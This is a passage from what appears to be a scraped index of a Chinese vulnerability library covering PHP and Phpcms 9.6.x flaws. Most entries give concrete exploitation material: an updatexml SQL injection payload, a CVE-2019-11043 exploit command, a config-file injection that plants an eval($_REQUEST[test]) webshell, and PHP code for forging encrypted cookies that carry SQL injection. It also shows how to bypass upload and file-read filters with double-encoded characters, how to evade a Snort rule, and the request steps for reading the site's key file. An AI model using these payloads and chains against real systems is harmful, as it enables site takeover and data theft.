field=1)/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/user()),0x7e),1)#&keyword=title&scode=1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-04 12:54:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Php/1.html":{"url":"0day/Php/1.html","title":"（CVE-2019-11043）远程命令执行","keywords":"","body":"（CVE-2019-11043）远程命令执行 一、漏洞简介 NgiNginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 nx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 二、漏洞影响 Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 location ~ /.php(/|$) { fastcgi_split_path_info ^(.+?.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } } 三、复现过程 https://github.com/ianxtianxt/CVE-2019-11043 ./phuip-fpizdam.exe [url] 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:40:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Php/3.html":{"url":"0day/Php/3.html","title":"PHP序列化和反序列化语法差异问题","keywords":"","body":"PHP序列化和反序列化语法差异问题 介绍 官方文档中介绍PHP序列化和反序列化如下： 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 简单说序列化是对象转化字符串的过程，反序列化是字符串还原对象的过程。 环境 文章中所述内容使用环境如下: PHP7.3.1、SDK VSCode C++和C 环境配置建议参考：《WINDOWS下用VSCODE调试PHP7源代码》https://www.jianshu.com/p/29bc0443*6 (作者经过几小时尝试后找到最全的版本) 在网上公开参数反序列化执行流程已经非常详细，但是对于一些细节地方有一些不足，其中就包括序列化和反序列化之间的语法差异问题 差异问题 序列化 我们通过编译PHP内核源码分析，发现PHP序列化在默认情况下在对象转换中加入:{和}用来拼接成字符串。 [var.c] Line:882 static void php_var_serialize_intern() Line:896 if (ce->serialize(struc, &serialized_data, &serialized_length, (zend_serialize_data *)var_hash) == SUCCESS) { smart_str_appendl(buf, \"C:\", 2); smart_str_append_unsigned(buf, ZSTR_LEN(Z_OBJCE_P(struc)->name)); smart_str_appendl(buf, \":\\\"\", 2); smart_str_append(buf, Z_OBJCE_P(struc)->name); smart_str_appendl(buf, \"\\\":\", 2); smart_str_append_unsigned(buf, serialized_length); smart_str_appendl(buf, \":{\", 2); smart_str_appendl(buf, (char *) serialized_data, serialized_length); smart_str_appendc(buf, '}'); } Line:952 smart_str_appendl(buf, \":{\", 2); Line:995 smart_str_appendc(buf, '}'); 咱们来看上面这段代码，PHP会使用smart_str_appendl为序列化字符串前后拼接:{和}，从var.c的第882行开始进入序列化逻辑。在第896行进行序列化字符串拼接，第952行和第995行，对于内嵌方法进行拼接。 反序列化 反序列化是将序列化的字符串，按照一定语法规则进行转化还原。 [var_unserialize.c] Line:655 static int php_var_unserialize_internal() Line:674 { YYCTYPE yych; static const unsigned char yybm[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, }; if ((YYLIMIT - YYCURSOR) 通过内核代码能够看到第655行进入反序列化，反序列化是利用词法扫描，判断各项符号转换对应对象。能够看到反序列化中对于}进行了处理，处理中只是对计数器加一并没有其他操作。 实际作用 反序列化语法的差异，对于安全防护设备判断反序列化产生很大的影响。在Snort中，有段规则如下： alert tcp any any -> any [80,8080,443] (uricontent:\".php\"; pcre:\"/\\{\\w:.+?\\}/\"; sid:1; msg:php_serialize;) 在攻击载荷中可以使用大多数字符代替{},从而导致规则失效。 总结 在红队攻击中可以利用PHP序列化和反序列化语法差异，从而达到绕过防护的目的。 在蓝队防御中建议考虑定义中所述不会保存对象的方法，只会保存类的名字。，拦截保存类的名字，以及语法中相同的字符比如冒号进行防御。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 21:08:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Php/4.html":{"url":"0day/Php/4.html","title":"php mt_rand函数的安全问题探讨","keywords":"","body":"php mt_rand函数的安全问题探讨 mt_rand() 函数的安全性问题 php -r 'echo getrandmax().\"\\n\".mt_getrandmax().\"\\n\"; echo (pow(2,31)-1).\"\\n\";' 在我的 linux 64 位系统中,rand() 和 mt_rand() 产生的最大随机数都是2147483647, 正好是 2^31-1 , 也就是说随机播种的种子也是在这个范围中,0 – 2147483647 的这个范围是允许我们进行爆破的. 但是用 php爆破比较慢 这里放一个爆破poc的d地址 php_mt_seed爆破程序 https://github.com/ianxtianxt/php-mt_rand 下面演示一下它的用法: 在例子中,我没有自己播种种子,而是让php自动去播种一个种子并产生一个随机数,然后用 php_mt_seed 这个工具把产生的随机数作为参数,去爆破种子,最后的得到了四个结果. 经过验证,四个结果都是对的.都会产生这样的一个随机数. 但是还有一个疑问,就是 php manual 中说,自动播种种子是指:在每次调用 mt_rand()函数之前都播种一次种子呢,还是多次调用 mt_rand()函数之前,只播种一次种子呢,这对于我们能否猜到产生的随机数序列至关重要. 看下面的测试: 在测试中,在没有进行手工播种的情况下产生两个连续的随机数,然后去爆破种子,得到了四个可能种子,经过测试发现其中一个种子产生的随机数序列和预期的相同,所以可以猜想在php中产生一系列的随机数时,只进行了一次播种! 那请考虑下面代码的安全性: 我们是否可以根据公开的key,猜到 $private 呢? 运行一次上面的代码: njctf$ php mtRand.php [*] This is a key for public:uS66FDD9LCR62UV3 [*] Create a private key which you don\\'t know:t3JSUHzYAv 下面演示破解过程,首先获得public key在每一位在字符串中的位置: 然后用 php_mt_seed 进行破解,这个需要的时间还是挺长的,几分钟左右. 已经成功的破解了一个seed,下面看这个seed对不对: 跟刚才的结果一模一样 : 这样就说明了,我们只需要拿到public key,就可以预测到private key 的值了. 但是在有的一些环境中，public key可能在private key之后产生，但是知道private key的位数 怎么预测private key呢？ 强大的php_mt_seed_4.0,支持一些统配的写法，把未知的都写成参数 0 0 0 0 就可以了php_mt_seed详细的使用说明。它就会跳过前面的mt_rand()的一些输出，直接匹配后面的： 下面测试我们获得了private key，来猜测public key的情况。 下面就开始破解： ➜ Desktop echo $(python -c \"print '0 '*64\") $(php mtRand.php) | xargs ~/script/php_mt_seed-4.0/php_mt_seed Pattern: SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 Version: 3.0.7 to 5.2.0 Found 0, trying 0xfc000000 - 0xffffffff, speed 65.2 Mseeds/s Version: 5.2.1+ Found 0, trying 0xf0000000 - 0xf1ffffff, speed 5.5 Mseeds/s seed = 0xf0430121 = 4030923041 (PHP 5.2.1 to 7.0.x; HHVM) Found 1, trying 0xfe000000 - 0xffffffff, speed 5.5 Mseeds/s Found 1 可以看到破解得到的seed和之前的一样。 接下来看一个 njctf中的一个例子,只贴部分关键代码: 我们的目标是猜测出filename. 这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了. rand() 函数的安全性问题 rand() 函数在产生随机数的时候没有调用 srand(),则产生的随机数是有规律可询的. 具体的说明请看这里http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/ 产生的随机数可以用下面这个公式预测 : state[i] = state[i-3] + state[i-31] (一般预测值可能比实际值要差1) 写下面测试代码,验证一下: =31) { echo \"$randStr[$i]=(\".$randStr[$i-31].\"+\".$randStr[$i-3].\") mod 31\".\"\\n\"; } } ?> 看一下结果: 发现预测的值,基本都是对的,这样就可以根据之前生成的随机数,预测之后产生的随机数. 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 12:53:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpcms/Phpcms v9.6.0后台getshell.html":{"url":"0day/Phpcms/Phpcms v9.6.0后台getshell.html","title":"Phpcms v9.6.0后台getshell","keywords":"","body":"Phpcms v9.6.0后台getshell 一、漏洞简介 phpsso_server 后台getshell 二、漏洞影响 Phpcms v9.6.0 三、复现过程 漏洞来自于ROOTDIR/phpsso_server/phpcms/modules/admin/system.php public function uc() { if (isset($_POST['dosubmit'])) { $data = isset($_POST['data']) ? $_POST['data'] : ''; $data['ucuse'] = isset($_POST['ucuse']) && intval($_POST['ucuse']) ? intval($_POST['ucuse']) : 0; $filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'system.php'; $config = include $filepath; $uc_config = ' $v) { $old[] = \"'$k'=>'\".(isset($config[$k]) ? $config[$k] : $v).\"',\"; $new[] = \"'$k'=>'$v',\"; $uc_config .= \"define('\".strtoupper($k).\"', '$v');\\n\"; } $html = file_get_contents($filepath); $html = str_replace($old, $new, $html); $uc_config_filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'uc_config.php'; @file_put_contents($uc_config_filepath, $uc_config); @file_put_contents($filepath, $html); $this->db->insert(array('name'=>'ucenter', 'data'=>array2string($data)), 1,1); showmessage(L('operation_success'), HTTP_REFERER); } $data = array(); $r = $this->db->get_one(array('name'=>'ucenter')); if ($r) { $data = string2array($r['data']); } include $this->admin_tpl('system_uc'); } 来自这段中的 $data = isset($_POST['data']) ? $_POST['data'] : ''; 和 foreach ($data as $k => $v) { $old[] = \"'$k'=>'\".(isset($config[$k]) ? $config[$k] : $v).\"',\"; $new[] = \"'$k'=>'$v',\"; $uc_config .= \"define('\".strtoupper($k).\"', '$v');\\n\"; } 这里接收post['data']数据中的key，value并写入配置文件ROOTDIR/phpsso_server/caches/configs/uc_config.php中 在ROOTDIR/phpcms/libs/classes/param.class.php中 public function __construct() { if(!get_magic_quotes_gpc()) { $_POST = new_addslashes($_POST); $_GET = new_addslashes($_GET); $_REQUEST = new_addslashes($_REQUEST); $_COOKIE = new_addslashes($_COOKIE); } 全局过滤了post，但是这里只过滤了value，并没有过滤key 在这个地方，我们可以构造 name=\"data[uc_api','11');/*]\" 并在Ucenter api 地址输入: */eval($_REQUEST[test]);// 再进行缓存更新 就成功写入了一句话 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-17 23:15:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpcms/Phpcms v9.6.0 sql注入.html":{"url":"0day/Phpcms/Phpcms v9.6.0 sql注入.html","title":"Phpcms v9.6.0 sql注入","keywords":"","body":"Phpcms v9.6.0 sql注入 一、漏洞简介 二、漏洞影响 Phpcms v9.6.0 三、复现过程 这个版本的 SQL注入 主要在于程序对解密后的数据没有进行过滤，我们来看一下漏洞文件 phpcms/modules/content/down.php 。在其 init 方法中，从 GET 数据中获取了 a_k 的值，该值若能解密成程序规定格式的字符串，则程序继续运行（这里加解密使用的秘钥必须一致，例如这里秘钥为 pc_base::load_config('system','auth_key') ）。程序将解密后的数据用 parse_str 函数处理，这里又存在变量覆盖问题。然后将可控变量 $id 带入数据库查询，我们跟进 get_one 方法。 get_one 方法调用了 sqls 方法，而在 sqls 方法中可以明显看到，未过滤的数据直接拼接进了 SQL 语句中。 那么现在，我们要解决的问题是：如何构造出加密数据，使得数据能够被正常解密？我们先来看一下 sys_auth 函数的代码，其代码位于 phpcms/libs/functions/global.func.php 中。开头我们可以很明显看到，当我们没有指定加解密用的 key 时，系统默认使用 pc_base::load_config('system','auth_key') 作为 key ，这样我们就不用特地去搜索形如 sys_auth('xxx','ENCODE',pc_base::load_config('system','auth_key')) 的代码段，直接搜索形如 sys_auth('可控字符串','ENCODE') 或 sys_auth('可控字符串') 的代码段即可。（这里搜索这种代码段的目的，是为了找到可利用的点将恶意 payload 进行加密，然后传输给开头 phpcms/modules/content/down.php 文件的 init 方法进一步利用） 通过搜索，会发现在 set_cookie 方法中使用了 sys_auth($value, 'ENCODE') ，我们可以寻找是否存在可控的 $value 。 我们可以搜到 phpcms/modules/wap/index.php 文件，在该文件中 $_GET['siteid'] 可控，并且可以通过 cookie 获得加密后的数据，但是这里有 intval 过滤，所以无法放置我们的 payload 。 我们继续寻找，会发现 phpcms/modules/attachment/attachments.php 文件的 swfupload_json 方法有满足我们需要的代码。程序将可控数据放在了 cookie ，其中可控数据中，比较好利用的是 $_GET['src'] 。 $_GET['src'] 只是经过了 safe_replace 函数的过滤，该函数会将某些字符替换为空，而我们却可以在 payload 中插入这些字符，从而绕过黑名单的过滤。 safe_replace 函数代码如下： 貌似现在已经找到了利用链了？别高兴的太早。在调用这个 swfupload_json 方法之前，程序会执行 attachments 类的 __construct 方法，而这个方法中有用户登录状态检测。用于登录状态检测的 $this->userid 可以来自 sys_auth($_POST['userid_flash'],'DECODE') ，即我们让 $_POST['userid_flash'] 经过 sys_auth 方法解密之后有东西即可。而这个加密数据，就可以利用我们上面说到的 phpcms/modules/wap/index.php 文件。通过 cookie 获取 $_GET['siteid'] 加密后的数据，然后再作为 $_POST['userid_flash'] 的值，即可绕过登录检测。 绕过登录检测后，我们将 payload 传给 phpcms/modules/attachment/attachments.php 文件 swfupload_json 方法中的 $_GET['src'] ，再利用开头 parse_str 函数进行变量覆盖，最终完成整个漏洞链。整个漏洞的利用流程图如下： 按照默认配置安装的网站搭建好后， WAP 是处于禁用状态，但是这并不影响我们获得加密后的 $_GET['siteid'] 。 我们再来假设，如果网站管理员删除了 WAP 模块的代码，这个洞还能利用吗？我们可以继续来挖掘一下这个漏洞链的其他入口，这也是网络上未公开的一个入口点。上面我们在搜索 set_cookie 方法找可控数据时，会发现 phpcms/modules/mood/index.php 文件的 post 方法可以直接获得一个加密后的数据，这样我们就可以将这个数据，用在漏洞链的第二步：绕过用户登录验证，具体代码如下： 这里只要按照代码逻辑，构造参数即可。这里可能还要注意本类的 __construct 方法，同样按照逻辑构造参数即可，具体构造这里不再赘述。 通过上面这个漏洞链入口，我们便可以进行 报错SQL注入 。比较有意思的是， PHPCMS 会将 admin 登录的 cookie 存储在数据库中，我们可以通过注入获取管理员 cookie ，然后伪造管理员身份利用后台 getshell 。这里如何伪造身份，网络上貌似提及很少，唯一找到一篇文章https://www.secpulse.com/archives/57486.html ，发现作者竟然还少提及了一个关键参数。于是我将伪造的数据包，与正常登录的数据包进行对比，逐个删除 cookie 中的数据，看看少了哪个关键参数。接下来，我们来具体看一下如何伪造 cookie 进入后台。 PHPCMS 专门在数据库中建了一个表来存放 PHPSESSID ，其中也包含管理员的 PHPSESSID ，且登录状态下的 userid 字段会被设为1，注销则为0，具体如下： 我们把 PHPSESSID=9t9mrk25ak5sb9v60nc255ql11 加到 cookie 中，直接访问后台，这是发现程序还是会让你登录，估计我们是少了什么，下面来动态调试一下。经过调试，我们会发现程序终止在了 admin 类 __construct 方法的 self::check_admin() 语句中，其具体代码如下： 可以明显看到，我们原先的 cookie 中少了 $userid 对应的字段，而且要想绕过登录，必须保证 $_SESSION['roleid'] 和 $userid 相等且它们两者非空。那么现在，我们只要加上 $userid 对应字段就行了，其值可以从上面漏洞链第一步中的响应包 Set-Cookie 字段获取。这里要注意一个点，一旦管理员注销，我们就无法利用这个点伪造 cookie 了，这也是这个漏洞的鸡肋之处。 最后来看一下官方发布的 PHPCMS v9.6.1 中是如何修复这个漏洞的，补丁如下： 可以看到官方对解密后的数据进行了 safe_replace、intval 双重过滤处理。 参考链接 https://xz.aliyun.com/t/5730 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 11:35:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpcms/Phpcms v9.6.0 任意文件上传.html":{"url":"0day/Phpcms/Phpcms v9.6.0 任意文件上传.html","title":"Phpcms v9.6.0 任意文件上传","keywords":"","body":"Phpcms v9.6.0 任意文件上传 一、漏洞简介 二、漏洞影响 Phpcms v9.6.0 三、复现过程 这个漏洞存在于用户注册处。这里有一个可控变量 $_POST['info'] 传入了 member_input 类的 get 方法中，跟进该方法。(下图对应文件位置：phpcms/modules/member/index.php) 在 get 方法中，我们发现 $data 变量来自 $_POST['info'] ，并且我们可以调用 member_input 类的所有方法（对应下图 第47-48行 代码）。(下图对应文件位置：caches/caches_model/caches_data/member_input.class.php) 看了一下 member_input 类的所有方法，只有一个 editor 方法比较好利用，而本次漏洞正是利用到这个方法。在这个方法中，调用了 attachment 类的 download 方法。(下图对应文件位置：caches/caches_model/caches_data/member_input.class.php) 在 download 方法中，程序先使用正则对图片 URL 进行匹配，其中 $ext 只允许为gif|jpg|jpeg|bmp|png ，而我们使用 http://xxxx/1.php?a.jpg 或者 http://xxxx/1.php#a.jpg 即可绕过正则。(下图对应文件位置：phpcms/libs/classes/attachment.class.php) 接着又使用 fillurl 方法对匹配到的远程图片地址进行处理，其实就是将 # 号之后的字符全部去除，例如 http://xxxx/1.php#a.jpg 会被处理成 http://xxxx/1.php 。(下图对应文件位置：phpcms/libs/classes/attachment.class.php) fillurl 方法处理后，又回到了 download 方法。程序直接调用 copy 函数将远程文件复制到本地（对应下图 161 行代码），远程文件名可预测，后缀名为上边处理后的 URL 文件名后缀，即 php ，最终导致 getshell 。其中 webshell 地址为 http://website/uploadfile/date('Y/md/')/date('Ymdhis').rand(100, 999).'.'.$fileext 。(下图对应文件位置：phpcms/libs/classes/attachment.class.php) 最后我们再来看一下在官方发布的 PHPCMS v9.6.1 中是如何修复这个漏洞的，代码具体如下。可以明确看到，在官方补丁中，对 fileext($file) 获取到的文件后缀进行了黑名单校验。虽然暂时不能直接上传 shell ，但是还是可以上传图片马。如果 CMS 存在任意文件包含或任意文件名修改的漏洞，同样还是可以 getshell ，这里最好再对远程图片的内容进行校验下比较好。(下图对应文件位置：phpcms/libs/classes/attachment.class.php，左半图为PHPCMSv9.6.0，右半图为PHPCMSv9.6.1) 实际上，单这个补丁中的正则来说，是可以绕过的，例如： .php%7f ，Windows下会将非法字符替换成空，但是其实后续还有一系列的问题，导致我没绕过。本以为要挖到0day了，我傻乐了半天：) 参考链接 https://xz.aliyun.com/t/5730 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 11:35:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpcms/Phpcms v9.6.1 任意文件读取.html":{"url":"0day/Phpcms/Phpcms v9.6.1 任意文件读取.html","title":"Phpcms v9.6.1 任意文件读取","keywords":"","body":"Phpcms v9.6.1 任意文件读取 一、漏洞简介 二、漏洞影响 Phpcms v9.6.1 三、复现过程 这个版本的 任意文件读取 漏洞和上个版本的 SQL注入 漏洞原理是类似的，且出问题的文件均在 phpcms/modules/content/down.php 中。在该文件的 download 方法中最后一行调用了 file_down 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 我们再来看看 download 方法中有哪些限制条件。可以看到其开头部分的代码，和上一个版本的 SQL注入 类似，唯一不同的是这里加解密的 key 变成了 $pc_auth_key ，我们等下就要来找找使用 $pc_auth_key 进行加密的可控点。继续看 download 方法，里面对要下载的文件后缀进行了黑名单校验，但是末尾又对 > 字符进行替换，这就导致后缀名正则可被绕过，例如： **.ph 。(下图对应文件位置：phpcms/modules/content/down.php) 现在我们就要来找找使用 $pc_auth_key 作为加密 key 的可控点。通过搜索关键字，我们可以看到有三处地方。然而前两处地方是不可以利用的，因为都有登录检测。而第三个点就可以利用，我们看其中 $i、$d、$s 作为明文字符串被加密。(下图对应文件位置：phpcms/modules/content/down.php) 有了加密字符串，我们如何能够从前台获取呢，这里其实在最后一行包含模板文件时，将加密字符串 $downurl 输出了，这样也就解决了我们获取的问题。 那 $i、$d、$s 这三个变量从哪里来？我们往前看，代码有没有相当熟悉？这里只对 $i 进行了 intval 过滤，其他两个变量还是可以利用。而且加密字符串 $a_k 的获取，就和上个版本的 SQL注入 漏洞攻击链的前2步是一样的，这里不再赘述。(下图对应文件位置：phpcms/modules/content/down.php) 我们在构造 payload 的时候，我们要注意整个攻击过程会经过两次 safe_replace 、两次 parse_str 、一次 str_replace(array(''), '',$fileurl) ，而程序对 .. 和 php 字符进行了检测。所以我们要想访问 php 文件或进行路径穿越，后缀可以设置成 ph>p ，路径符可以变成 .>. 。但是 safe_replace 函数会 str_replace('>','>',$string) ，所以 > 字符需要编码两次，变成 %25253e 。 我们可以将整个漏洞的触发过程整理成下图： 最后来看一下官方发布的 PHPCMS v9.6.2 中是如何修复这个漏洞的，补丁如下： 可以看到补丁将后缀匹配规则放在离下载文件最近的地方，貌似能防止规则中的文件被读取，但是我们可以利用 windows 的特性，在 windows 下绕过这个正则，这也是网传的一种 PHPCMS v9.6.2任意文件下载 漏洞。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 11:41:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpcms/Phpcms v9.6.2 前台sql注入.html":{"url":"0day/Phpcms/Phpcms v9.6.2 前台sql注入.html","title":"Phpcms v9.6.2 前台sql注入","keywords":"","body":"Phpcms v9.6.2 前台sql注入 一、漏洞简介 二、漏洞影响 Phpcms v9.6.2 三、复现过程 漏洞分析 这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的 key 值，我们可以用这个 key 加密我们的 SQL注入payload 。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲 v9.6.2 版本的注入只能在 windows 上利用，具体原因在上面的任意文件读取漏洞分析时也说了。下面我们来具体分析一下这个漏洞。 漏洞文件位于 phpcms/modules/member/classes/foreground.class.php ，代码如下图。我们可以明显看到下图第33行，程序直接将解密后的数据未经过滤直接带入查询。而待解密数据 $phpcms_auth 和解密秘钥 $auth_key 均可构造。 我们先来看一下待解密数据 $phpcms_auth 如何构造。从下图中，可以看出程序将从 cookie 中的 xxx_auth 字段经过 sys_auth 函数解密后，返回给了 $phpcms_auth ，而默认情况下使用 pc_base::load_config('system', 'auth_key') 作为加解密的 key 值。 而 pc_base::load_config('system', 'auth_key') 的值在网站搭建好后，会存储在 caches/configs/system.php 中，我们可以通过任意文件读取来获得这个值。 现在 $phpcms_auth 已经搞定了，我们再来看看 $auth_key = get_auth_key('login') 如何构造，跟进 get_auth_key 的代码。我们可以看到 $auth_key 由 $prefix、pc_base::load_config('system','auth_key')、ip() 三个元素决定。前两个都是已知的，而第三个获取用户IP的函数存在IP伪造的问题，也可以是固定的。 所以 get_auth_key('login') 的值也是我们可以构造的，剩下的事情只要我们将 payload 传给加密函数加密两次即可。我们最后再来看一下 PHPCMS v9.6.3 中是如何修复这个漏洞的，补丁如下： 可以明显看到，补丁将解密后获得的 $userid 进行了强转。 漏洞复现 分析完毕后得到大致流程： 解密操作：get_cookie(‘auth’) 得到$phpcms_auth，get_auth_key(‘login’)得到$auth_key，然后sys_auth($phpcms_auth, ‘DECODE’, $auth_key)。 再通俗些的话：sys_auth方法对cookie中包含auth的参数名对应的密文值，先使用配置文件中的auth_key进行sys_auth得到的值作为第一次解密后的值，然后使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，第一次解密后的值与新的key最后传入sys_auth进行解密得到最终的明文。 反之加密方法便是： 使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，使用新的key与明文进行sys_auth得到的值作为第一次加密的密文，然后使用配置文件中的auth_key作为key与第一次加密的密文传入sys_auth得到的值作为最终的密文，也就是cookie字段名称中包含auth的参数对应的值。 如下是将各个文件中的加密解密方法抓取出来稍作修改，在本地进行payload的加解密操作： 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '='); } } function get_auth_key($prefix,$suffix=\"\",$ip='127.0.0.1',$auth_key='7G6idVtMAxhgFVu5vGp1') { if($prefix=='login'){ $pc_auth_key = md5($auth_key.$ip); }else if($prefix=='email'){ $pc_auth_key = md5($auth_key); }else{ $pc_auth_key = md5($auth_key.$suffix); } $authkey = md5($prefix.$pc_auth_key); return $authkey; } //解密过程 //step 1 $encryption_str = '6fc7TB1Y1nIRK5HunMc5HAUw5WkBLLuQGBiOISDhJM4d8N8WHHOvqMaUSyWrZdVdH046oGv_e_Ir6Q157UV-yT5Aksuc_h_4RfwZqsEwDHfQckv4SReOiYFxm083X7Tydcw-nUy8l3nP-ouUGl59sN4'; $operation1 = 'DECODE'; $decryption_step1 = (sys_auth($encryption_str, $operation1)); echo 'decryption_step1 result:'.$decryption_step1.\"\\n\"; //step 2 $decryption_step2 = $decryption_step1; $auth_key = get_auth_key('login'); echo 'decryption_step2 result:'.sys_auth($decryption_step2, 'DECODE', $auth_key).\"\\n\"; echo '-----------------------'.\"\\n\" ; //加密过程 //step 1 $clear_str = \"1'or updatexml(1,concat(0x7e,(select user()),0x7e),1) or '1 f867fef04bd76d95abe01300951ca336\"; $operation2 = 'ENCODE'; $encryption_step1 = sys_auth($clear_str, 'ENCODE', $auth_key); echo 'encryption_step1 result:'.$encryption_step1.\"\\n\"; //step 2 $encryption_step2 = (sys_auth($encryption_step1, $operation2)); echo 'encryption_step2 result:'.$encryption_step2; 使用上面的代码可以进行解密和加密，下图中decryption_step2 result的值便是对payload进行解密的最终结果，encryption_step2的值是对payload进行加密的最终结果。 最终利用的现象，cookie中的YDVIB_auth参数名称，前缀是安装时候生成的可能不一样，可以在配置文件中找到对应的值，可以先注册普通用户然后看服务端下发的cookie中字段名称中xxx_auth的参数名称，便是存在漏洞的位置。 参考链接 https://www.freebuf.com/column/158352.html https://xz.aliyun.com/t/5731 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 11:52:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Phpcms/Phpcms v9.6.2 任意文件下载.html":{"url":"0day/Phpcms/Phpcms v9.6.2 任意文件下载.html","title":"Phpcms v9.6.2 任意文件下载","keywords":"","body":"Phpcms v9.6.2 任意文件下载 一、漏洞简介 二、漏洞影响 三、复现过程 第一步:进行如下请求获得YDVIB_siteid的值。 请求： [GET]http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=wap&c=index&a=init&siteid=1 获得： [cookie]YDVIB_siteid:75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst 第二步:在[POST DATA] 中的userid_flash参数的值设置为，第一步请求得到的YDVIB_siteid参数的值，并进行如下请求。 请求： [GET] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&c=attachments&a=swfupload_json&src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%253ep%2581%26modelid=1%26d=1&aid=1 [POST DATA] userid_flash=75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst 获得： [cookie] 